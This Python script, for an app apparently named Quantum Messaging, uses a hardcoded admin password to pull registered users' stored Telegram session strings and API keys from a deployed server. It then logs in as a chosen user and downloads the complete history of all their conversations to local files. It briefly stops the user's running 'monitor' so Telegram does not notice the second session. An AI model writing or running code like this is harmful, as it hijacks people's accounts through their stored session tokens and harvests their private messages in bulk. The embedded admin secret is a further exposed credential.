#!/usr/bin/env python3
"""
Download complete Telegram message history for any registered user.
Fetches credentials from the deployed Render app, connects via Telethon,
and saves all conversations to ./downloads/<username>/.

SAFETY: Before connecting, the script pauses the user's monitor on Render
to avoid simultaneous session usage (which Telegram punishes by permanently
revoking the auth key). The monitor is always restarted after downloading,
even if an error occurs.

INCREMENTAL: Messages are saved in JSONL format (one JSON object per line).
Each batch of messages is flushed to disk immediately, so you can watch
files populate in real time. Downloads are resumable — if interrupted, the
script picks up where it left off by reading the oldest message ID already
saved for each chat.
"""

import os
import re
import sys
import json
import asyncio
import time
import requests
from datetime import datetime

from telethon import TelegramClient
from telethon.sessions import StringSession

APP_URL = "https://quantummessaging.onrender.com"
ADMIN_PASSWORD = "@eiRclncne14Twm"
ADMIN_HEADERS = {"X-Admin-Password": ADMIN_PASSWORD}
DOWNLOADS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "downloads")

BATCH_SIZE = 100  # messages per batch


def fetch_users():
    """Fetch all registered users from the deployed app."""
    resp = requests.get(f"{APP_URL}/api/admin/users", headers=ADMIN_HEADERS)
    resp.raise_for_status()
    return resp.json()["users"]


def fetch_telegram_creds(username):
    """Fetch Telegram credentials for a specific user."""
    resp = requests.get(
        f"{APP_URL}/api/admin/user/{username}/telegram", headers=ADMIN_HEADERS,
    )
    resp.raise_for_status()
    return resp.json()["telegram"]


def stop_monitor(username):
    """Stop the monitor for a user on Render."""
    try:
        resp = requests.post(
            f"{APP_URL}/api/admin/user/{username}/monitor/stop",
            headers=ADMIN_HEADERS,
        )
        resp.raise_for_status()
        return resp.json().get("success", False)
    except Exception as e:
        print(f"  WARNING: Could not stop monitor: {e}")
        return False


def start_monitor(username):
    """Restart the monitor for a user on Render."""
    try:
        resp = requests.post(
            f"{APP_URL}/api/admin/user/{username}/monitor/start",
            headers=ADMIN_HEADERS,
        )
        resp.raise_for_status()
        return resp.json().get("success", False)
    except Exception as e:
        print(f"  WARNING: Could not restart monitor: {e}")
        return False


def sanitize_name(name):
    """Sanitize a name for use as a directory name."""
    if not name:
        name = "unknown"
    name = re.sub(r'[<>:"/\\|?*]', "_", name)
    name = name.strip(". ")
    return name[:100] or "unknown"


def serialize_message(msg):
    """Convert a Telethon message to a serializable dict."""
    media_type = None
    if msg.media:
        media_type = type(msg.media).__name__

    return {
        "message_id": msg.id,
        "date": msg.date.isoformat() if msg.date else None,
        "sender_id": msg.sender_id,
        "text": msg.text or "",
        "is_outgoing": msg.out,
        "media_type": media_type,
        "reply_to_msg_id": msg.reply_to.reply_to_msg_id if msg.reply_to else None,
    }


def get_resume_offset(jsonl_path):
    """Read existing JSONL file and return the oldest message_id for resuming.

    Messages are written newest-first, so the last line has the oldest ID.
    Returns (existing_count, oldest_message_id) or (0, None) if no file.
    """
    if not os.path.exists(jsonl_path):
        return 0, None

    count = 0
    oldest_id = None
    with open(jsonl_path, "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            count += 1
            try:
                msg = json.loads(line)
                oldest_id = msg["message_id"]
            except (json.JSONDecodeError, KeyError):
                pass

    return count, oldest_id


async def download_user_history(username, creds):
    """Connect to Telegram and download all message history incrementally."""
    session_string = creds.get("session_string")
    api_id = int(creds["api_id"])
    api_hash = creds["api_hash"]

    if not session_string:
        print(f"  ERROR: No session string for {username}")
        return

    user_dir = os.path.join(DOWNLOADS_DIR, username)
    os.makedirs(user_dir, exist_ok=True)

    client = TelegramClient(
        StringSession(session_string), api_id, api_hash,
        receive_updates=False,
    )

    await client.connect()

    if not await client.is_user_authorized():
        print("  ERROR: Session is not authorized")
        await client.disconnect()
        return

    me = await client.get_me()
    print(f"  Connected as: {me.first_name} (@{me.username}), ID: {me.id}")

    # Fetch all dialogs
    dialogs = await client.get_dialogs()
    print(f"  Found {len(dialogs)} conversations\n")

    summary = []

    for i, dialog in enumerate(dialogs, 1):
        chat_name = dialog.name or f"chat_{dialog.id}"
        safe_name = sanitize_name(chat_name)
        chat_dir = os.path.join(user_dir, f"{safe_name}_{dialog.id}")
        os.makedirs(chat_dir, exist_ok=True)
        jsonl_path = os.path.join(chat_dir, "messages.jsonl")

        # Check for resume
        existing_count, oldest_id = get_resume_offset(jsonl_path)
        if existing_count > 0:
            print(f"  [{i}/{len(dialogs)}] {chat_name} (resuming, {existing_count} already saved)...", end=" ", flush=True)
        else:
            print(f"  [{i}/{len(dialogs)}] {chat_name}...", end=" ", flush=True)

        # Download messages in batches, appending to JSONL
        # iter_messages goes newest→oldest; offset_id fetches messages older than that ID
        new_count = 0
        try:
            with open(jsonl_path, "a", encoding="utf-8") as f:
                batch = []
                kwargs = {"limit": None}
                if oldest_id is not None:
                    kwargs["offset_id"] = oldest_id

                async for msg in client.iter_messages(dialog, **kwargs):
                    batch.append(serialize_message(msg))

                    if len(batch) >= BATCH_SIZE:
                        for m in batch:
                            f.write(json.dumps(m, ensure_ascii=False) + "\n")
                        f.flush()
                        new_count += len(batch)
                        print(f"\r  [{i}/{len(dialogs)}] {chat_name}... {existing_count + new_count} messages", end="", flush=True)
                        batch = []

                # Write remaining batch
                if batch:
                    for m in batch:
                        f.write(json.dumps(m, ensure_ascii=False) + "\n")
                    f.flush()
                    new_count += len(batch)

        except Exception as e:
            print(f" ERROR ({e}), skipping")
            # Still record what we have so far
            summary.append({
                "chat_id": dialog.id,
                "name": chat_name,
                "folder": f"{safe_name}_{dialog.id}",
                "message_count": existing_count + new_count,
                "unread_count": dialog.unread_count,
                "error": str(e),
            })
            continue

        total_for_chat = existing_count + new_count
        if existing_count > 0 and new_count == 0:
            print(f" {total_for_chat} messages (complete)")
        else:
            print(f"\r  [{i}/{len(dialogs)}] {chat_name}... {total_for_chat} messages" + (" (resumed)" if existing_count > 0 else ""))

        summary.append({
            "chat_id": dialog.id,
            "name": chat_name,
            "folder": f"{safe_name}_{dialog.id}",
            "message_count": total_for_chat,
            "unread_count": dialog.unread_count,
        })

    # Save summary
    with open(os.path.join(user_dir, "summary.json"), "w", encoding="utf-8") as f:
        json.dump({
            "username": username,
            "telegram_user": f"{me.first_name} (@{me.username})",
            "telegram_id": me.id,
            "downloaded_at": datetime.utcnow().isoformat(),
            "total_conversations": len(summary),
            "total_messages": sum(c["message_count"] for c in summary),
            "conversations": summary,
        }, f, ensure_ascii=False, indent=2)

    await client.disconnect()

    total_msgs = sum(c["message_count"] for c in summary)
    print(f"\n  Done! {len(summary)} conversations, {total_msgs} total messages")
    print(f"  Saved to: {user_dir}")


def main():
    print("\n=== Quantum Messaging — Download Telegram History ===\n")

    # Fetch users
    print("Fetching registered users...")
    try:
        users = fetch_users()
    except Exception as e:
        print(f"ERROR: Could not fetch users: {e}")
        sys.exit(1)

    if not users:
        print("No users found.")
        sys.exit(0)

    # Display user list
    print(f"\nRegistered users ({len(users)}):\n")
    for i, u in enumerate(users, 1):
        status = "active" if u.get("is_active") else "inactive"
        setup = "setup complete" if u.get("setup_complete") else "setup pending"
        monitor = "monitor running" if u.get("is_running") else "monitor stopped"
        print(f"  {i}. {u['username']:<15} [{status}, {setup}, {monitor}]")

    # User selection
    print()
    choice = input("Select user number (or 'q' to quit): ").strip()
    if choice.lower() in ("q", "quit", "exit"):
        return

    try:
        idx = int(choice) - 1
        if idx < 0 or idx >= len(users):
            raise ValueError
    except ValueError:
        print("Invalid selection.")
        sys.exit(1)

    selected = users[idx]
    username = selected["username"]
    monitor_was_running = bool(selected.get("is_running"))

    print(f"\nFetching Telegram credentials for '{username}'...")
    try:
        creds = fetch_telegram_creds(username)
    except Exception as e:
        print(f"ERROR: Could not fetch credentials: {e}")
        sys.exit(1)

    if not creds.get("session_string"):
        print(f"ERROR: No session string available for '{username}'")
        sys.exit(1)

    # --- SAFETY: stop monitor before using the session ---
    if monitor_was_running:
        print(f"  Pausing monitor for '{username}' to avoid session conflict...")
        stop_monitor(username)
        time.sleep(5)  # give the monitor time to fully disconnect

    try:
        print(f"Downloading all history for '{username}'...\n")
        asyncio.run(download_user_history(username, creds))
    finally:
        # --- SAFETY: always restart monitor ---
        if monitor_was_running:
            print(f"\n  Restarting monitor for '{username}'...")
            start_monitor(username)
            print("  Monitor restarted.")


if __name__ == "__main__":
    main()
